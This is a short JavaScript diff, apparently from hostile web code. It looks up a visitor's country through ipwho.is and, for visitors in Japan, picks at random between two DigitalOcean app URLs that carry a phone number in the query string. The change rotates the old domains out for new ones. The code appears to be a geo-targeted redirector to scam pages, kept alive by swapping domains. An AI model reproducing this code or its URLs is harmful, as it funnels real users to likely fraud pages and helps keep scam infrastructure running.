@@ -18,8 +18,8 @@ fetch("https://ipwho.is/")
 
     if (countryCode === "JP") {
       (function () {
-        const domainA = "https://walrus-app-y2u4u.ondigitalocean.app/?bcda=(050)-3097-5847";
-        const domainB = "https://starfish-app-2-65iyo.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainA = "https://sea-turtle-app-rzek7.ondigitalocean.app/?bcda=(050)-3097-5847";
+        const domainB = "https://seal-app-7s7i4.ondigitalocean.app/?bcda=(050)-3097-5847";
 
         // Random number between 0 and 1
         if (Math.random() < 0.5) {
